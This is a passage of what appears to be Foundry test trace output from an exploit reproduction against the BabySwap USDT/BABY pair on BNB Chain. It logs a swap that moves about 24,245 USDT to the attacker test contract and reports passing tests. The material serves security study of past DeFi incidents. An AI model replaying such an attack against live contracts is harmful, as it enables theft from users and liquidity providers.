    │   │   │   @ 0xd7b6990105719101dabeb77144f2a3385c8033acd3af97e9423a695e81ad1eb6: 0x00000000000000000000000000000000000000000085c89e491bb215cca54be9 → 0x00000000000000000000000000000000000000000085cdc09c67098bf6e71b3f
    │   │   │   @ 0xd7b6990105719101dabeb77144f2a3385c8033acd3af97e9423a695e81ad1eb7: 0x00000000000000000000000000000000000000000e853c29d9b11f704f9e4c23 → 0x00000000000000000000000000000000000000000e85414c2cfc76e679e01b79
    │   │   │   @ 0x3835ca2c2a97ccb41a6d08ea51b3689e7336d0a1e7bd2e142f2f2ea8620959c3: 0 → 0x00000000000000000000000000000000000000000000000000000000014cd30b
    │   │   │   @ 0xd7b6990105719101dabeb77144f2a3385c8033acd3af97e9423a695e81ad1eba: 0x00000000000000000000000000000000000000000000000000000000014cd2ab → 0x00000000000000000000000000000000000000000000000000000000014cd30b
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [622] BABYSWAP_FACTORY::getPair(BABY_TOKEN: [0x53E562b9B7E5E94b81f10e96Ee70Ad06df3D2657], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
    │   │   └─ ← [Return] USDT_BABY_BABYPAIR: [0xE730C7B7470447AD4886c763247012DfD233bAfF]
    │   ├─ [56790] USDT_BABY_BABYPAIR::swap(0, 24245023699947778854742 [2.424e22], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [27971] USDT_TOKEN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 24245023699947778854742 [2.424e22])
    │   │   │   ├─ emit Transfer(from: USDT_BABY_BABYPAIR: [0xE730C7B7470447AD4886c763247012DfD233bAfF], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 24245023699947778854742 [2.424e22])
    │   │   │   ├─  storage changes:
    │   │   │   │   @ 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96: 0 → 0x000000000000000000000000000000000000000000000522534b57762a41cf56
    │   │   │   │   @ 0x1eccbb4934a720c78da31ca88af2ae5a133062cbe10d4bbbffb543572af07bd2: 0x000000000000000000000000000000000000000000008a9e11ed7d9a91b1f7cb → 0x00000000000000000000000000000000000000000000857bbea2262467702875
    │   │   │   └─ ← [Return] true
    │   │   ├─ [487] BABY_TOKEN::balanceOf(USDT_BABY_BABYPAIR: [0xE730C7B7470447AD4886c763247012DfD233bAfF]) [staticcall]
    │   │   │   └─ ← [Return] 27571757903542604891529555 [2.757e25]
    │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_BABY_BABYPAIR: [0xE730C7B7470447AD4886c763247012DfD233bAfF]) [staticcall]
    │   │   │   └─ ← [Return] 630357428326480317786229 [6.303e23]
    │   │   ├─ emit Sync(reserve0: 27571757903542604891529555 [2.757e25], reserve1: 630357428326480317786229 [6.303e23])
    │   │   ├─ emit Swap(sender: BABYSWAP_ROUTER: [0x8317c460C22A9958c27b4B6403b98d2Ef4E2ad32], amount0In: 1023169310952610070802257 [1.023e24], amount1In: 0, amount0Out: 0, amount1Out: 24245023699947778854742 [2.424e22], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   ├─  storage changes:
    │   │   │   @ 8: 0x633851a6000000008a9e11ed7d9a91b1f7cb00000015f5e1df15bdcd4ced7202 → 0x633852c600000000857bbea226246770287500000016ce8bfdac7ddbc891a153
    │   │   │   @ 9: 0x000000000000000000000000000000f1d6ce8834dfc1d71cb8577020ca02b859 → 0x000000000000000000000000000000f1d6d5a219d4d12599c375f3924b54e9f9
    │   │   │   @ 10: 0x000000000000000000000000000012ba040b573068ad569ebaeb794eba5001c7 → 0x000000000000000000000000000012ba31abb3d352419fca4537c3fdd828b547
    │   │   └─ ← [Stop]
    │   ├─  storage changes:
    │   │   @ 0x6338997bf0e58a25f30d17bd97448508ecd9886521bf315dd2a88c3189420322: 0xffffffffffffffffffffffffffffffffffffffffffffffc87a75ba1b260ef46b → 0xffffffffffffffffffffffffffffffffffffffffffff271e5bdefa0caa6ac51a
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000d8aa1e96c00e7ba42f51000000000000000000000000000000000000000000000522534b57762a41cf56
    ├─ [531] USDT_TOKEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 24245023699947778854742 [2.424e22]
    ├─ emit log_named_decimal_uint(key: "[End] Attacker USDT balance before exploit", val: 24245023699947778854742 [2.424e22], decimals: 18)
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 78.21s (75.63s CPU time)

Ran 2 test suites in 91.78s (79.16s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
